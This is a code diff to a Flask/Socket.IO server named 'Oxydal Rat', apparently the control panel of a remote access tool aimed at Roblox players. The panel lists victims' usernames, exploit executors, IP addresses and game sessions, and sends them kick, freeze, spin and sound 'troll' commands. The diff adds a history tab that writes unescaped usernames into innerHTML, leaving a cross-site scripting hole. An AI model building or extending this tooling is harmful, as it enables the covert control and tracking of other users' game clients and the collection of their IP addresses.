@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify, render_template_string, abort
 from flask_socketio import SocketIO
 import time
 import eventlet
+from datetime import datetime
 
 eventlet.monkey_patch()
 
@@ -14,6 +15,7 @@ ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
+history_log = []
 
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
@@ -42,6 +44,18 @@ def protect_routes():
     if request.path in ["/", "/kick", "/troll"]:
         check_ip()
 
+def add_history(event_type, username, details=""):
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    history_log.insert(0, {
+        "time": timestamp,
+        "type": event_type,
+        "username": username,
+        "details": details
+    })
+    if len(history_log) > 100:
+        history_log.pop()
+    socketio.emit("history_update", {"history": history_log[:50]})
+
 HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -51,29 +65,44 @@ HTML = """<!DOCTYPE html>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh;overflow-y:scroll}
-.container{max-width:1200px;margin:auto;padding:40px}
-h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
-.stats{text-align:center;margin:30px 0;font-size:1.8rem}
-.grid-wrapper{max-height:calc(100vh - 250px);overflow-y:auto;padding-right:10px}
-.grid-wrapper::-webkit-scrollbar{width:12px}
-.grid-wrapper::-webkit-scrollbar-track{background:rgba(0,0,0,0.3);border-radius:10px}
-.grid-wrapper::-webkit-scrollbar-thumb{background:linear-gradient(45deg,#00ffaa,#00aa88);border-radius:10px}
-.grid-wrapper::-webkit-scrollbar-thumb:hover{background:linear-gradient(45deg,#00ffcc,#00ccaa)}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
-.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
+body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh;overflow:hidden;display:flex}
+.sidebar{width:250px;background:rgba(10,10,10,0.95);border-right:2px solid #00ffaa;padding:20px;display:flex;flex-direction:column;gap:10px}
+.sidebar-btn{padding:15px;background:rgba(30,30,30,0.8);border:2px solid #333;border-radius:12px;color:#fff;font-size:1.1rem;font-weight:600;cursor:pointer;transition:all .3s;text-align:left}
+.sidebar-btn:hover{background:rgba(40,40,40,0.9);border-color:#00ffaa}
+.sidebar-btn.active{background:linear-gradient(45deg,#00ffaa,#00aa88);border-color:#00ffaa;box-shadow:0 0 20px rgba(0,255,170,0.5)}
+.main-content{flex:1;overflow:hidden;display:flex;flex-direction:column}
+.header{padding:30px 40px;text-align:center;border-bottom:2px solid #00ffaa}
+h1{font-family:Orbitron;font-size:3rem;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:15px}
+.stats{font-size:1.5rem;margin-top:10px}
+.content-area{flex:1;overflow:hidden;position:relative}
+.tab-content{display:none;height:100%;overflow-y:auto;padding:30px 40px}
+.tab-content.active{display:block}
+.tab-content::-webkit-scrollbar{width:12px}
+.tab-content::-webkit-scrollbar-track{background:rgba(0,0,0,0.3);border-radius:10px}
+.tab-content::-webkit-scrollbar-thumb{background:linear-gradient(45deg,#00ffaa,#00aa88);border-radius:10px}
+.tab-content::-webkit-scrollbar-thumb:hover{background:linear-gradient(45deg,#00ffcc,#00ccaa)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:15px}
+.card{background:rgba(20,20,20,.9);border-radius:18px;padding:20px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
 .card:hover{transform:translateY(-8px)}
-.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
-.dot{width:14px;height:14px;border-radius:50%;background:red;box-shadow:0 0 12px red}
+.status{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.dot{width:12px;height:12px;border-radius:50%;background:red;box-shadow:0 0 12px red}
 .dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
-.name{font-size:1.8rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
+.name{font-size:1.4rem;font-weight:600;color:#ffcc00;margin-bottom:8px;word-break:break-word}
 .name a{color:#ffcc00;text-decoration:none}
 .name a:hover{text-decoration:underline}
-.info{font-size:1rem;color:#aaa;margin-bottom:20px;line-height:1.5}
-.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1.1rem}
-button.kick-btn{padding:12px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;font-size:0.95rem;color:white;transition:transform .2s;margin-bottom:8px}
+.info{font-size:0.85rem;color:#aaa;margin-bottom:15px;line-height:1.4}
+.category{font-weight:bold;color:#00ffaa;margin:12px 0 8px;font-size:0.95rem}
+button.kick-btn{padding:10px;border:none;border-radius:10px;cursor:pointer;font-weight:bold;font-size:0.8rem;color:white;transition:transform .2s;margin-bottom:6px}
 button.kick-btn:hover{transform:scale(1.05)}
 button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform:none}
+.history-item{background:rgba(20,20,20,0.9);padding:15px;border-radius:12px;margin-bottom:12px;border-left:4px solid #00ffaa;transition:all .3s}
+.history-item:hover{background:rgba(30,30,30,0.9)}
+.history-item.connect{border-color:#00ffaa}
+.history-item.disconnect{border-color:#ff3366}
+.history-item.action{border-color:#ffcc00}
+.history-time{color:#00ffaa;font-weight:bold;font-size:0.9rem;margin-bottom:5px}
+.history-user{color:#ffcc00;font-weight:600;font-size:1.1rem;margin-bottom:5px}
+.history-details{color:#aaa;font-size:0.9rem}
 .modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000}
 .modal.active{display:flex}
 .modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
@@ -89,11 +118,25 @@ button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform
 </style>
 </head>
 <body>
-<div class="container">
-    <h1>Oxydal Rat</h1>
-    <div class="stats" id="stats">Players online: <b>0</b></div>
-    <div class="grid-wrapper">
-        <div class="grid" id="players"></div>
+<div class="sidebar">
+    <div class="sidebar-btn active" onclick="switchTab('players')">👥 Players</div>
+    <div class="sidebar-btn" onclick="switchTab('history')">📜 History</div>
+</div>
+
+<div class="main-content">
+    <div class="header">
+        <h1>Oxydal Rat</h1>
+        <div class="stats" id="stats">Players online: <b>0</b></div>
+    </div>
+    
+    <div class="content-area">
+        <div class="tab-content active" id="players-tab">
+            <div class="grid" id="players"></div>
+        </div>
+        
+        <div class="tab-content" id="history-tab">
+            <div id="history"></div>
+        </div>
     </div>
 </div>
 
@@ -125,6 +168,13 @@ button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform
 const socket = io();
 let currentKickId = null;
 const kickModal = document.getElementById("kickModal");
+
+function switchTab(tab) {
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.sidebar-btn').forEach(b => b.classList.remove('active'));
+    document.getElementById(tab + '-tab').classList.add('active');
+    event.target.classList.add('active');
+}
 
 function toast(msg, type = "success") {
     const t = document.createElement("div");
@@ -191,7 +241,7 @@ function render(data) {
             Game: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.game}</a><br>
             JobId: ${p.jobId}</div>
             <div class="category">TROLLS</div>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
@@ -202,7 +252,7 @@ function render(data) {
                 <button class="kick-btn" style="background:orange;" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
             </div>
             <div class="category">UNDO</div>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
@@ -217,7 +267,24 @@ function render(data) {
     });
 }
 
+function renderHistory(data) {
+    const historyDiv = document.getElementById("history");
+    historyDiv.innerHTML = "";
+    
+    data.history.forEach(item => {
+        const div = document.createElement("div");
+        div.className = `history-item ${item.type}`;
+        div.innerHTML = `
+            <div class="history-time">${item.time}</div>
+            <div class="history-user">${item.username}</div>
+            <div class="history-details">${item.details}</div>
+        `;
+        historyDiv.appendChild(div);
+    });
+}
+
 socket.on("update", render);
+socket.on("history_update", renderHistory);
 socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
 socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "offline"}`));
 </script>
@@ -236,8 +303,9 @@ def api():
             d = request.get_json(silent=True) or {}
             uid = str(d["userid"])
             if d.get("action") == "register":
+                username = d.get("username", "Unknown")
                 connected_players[uid] = {
-                    "username": d.get("username", "Unknown"),
+                    "username": username,
                     "executor": d.get("executor", "Unknown"),
                     "ip": d.get("ip", "Unknown"),
                     "last": now,
@@ -246,6 +314,7 @@ def api():
                     "gameId": d.get("gameId", 0),
                     "jobId": d.get("jobId", "Unknown")
                 }
+                add_history("connect", username, f"Connected from {d.get('game', 'Unknown')}")
             elif d.get("action") == "heartbeat" and uid in connected_players:
                 connected_players[uid]["last"] = now
         except: pass
@@ -274,6 +343,7 @@ def kick():
     reason = data.get("reason", "No reason")
     pending_kicks[uid] = reason
     name = connected_players.get(uid, {}).get("username", "Unknown")
+    add_history("action", name, f"KICKED: {reason}")
     socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
     return jsonify({"sent": True})
 
@@ -290,6 +360,10 @@ def troll():
         else:
             pending_commands[uid] = cmd
         name = connected_players.get(uid, {}).get("username", "Unknown")
+        details = f"{cmd.upper()}"
+        if assetId:
+            details += f" (Asset: {assetId})"
+        add_history("action", name, details)
         socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
 
@@ -302,10 +376,14 @@ def broadcast_loop():
             if now - p["last"] > 30:
                 to_remove.append(uid)
             else:
+                was_online = p["online"]
                 p["online"] = now - p["last"] < 15
+                if was_online and not p["online"]:
+                    add_history("disconnect", p["username"], "Connection lost")
                 if p["online"]: online += 1
         for uid in to_remove:
             username = connected_players.pop(uid, {}).get("username", "Unknown")
+            add_history("disconnect", username, "Disconnected")
             socketio.emit("status", {"username": username, "online": False})
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
